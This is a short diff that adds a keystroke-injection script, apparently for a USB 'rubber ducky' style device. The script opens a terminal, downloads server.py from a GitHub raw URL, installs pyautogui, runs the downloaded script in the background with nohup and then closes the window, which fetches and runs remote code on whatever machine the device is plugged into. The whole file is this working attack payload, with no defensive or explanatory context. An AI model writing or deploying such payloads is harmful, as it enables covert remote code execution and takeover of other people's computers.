@@ -1,0 +1,8 @@
+STRG ALT t
+DELAY 1000
+STRING (wget raw.githubusercontent.com/Linoschopp/pico/main/server.py ; pip3 install pyautogui ; nohup python3 server.py) &
+DELAY 100
+ENTER
+ALT f4
+DELAY 15
+ENTER
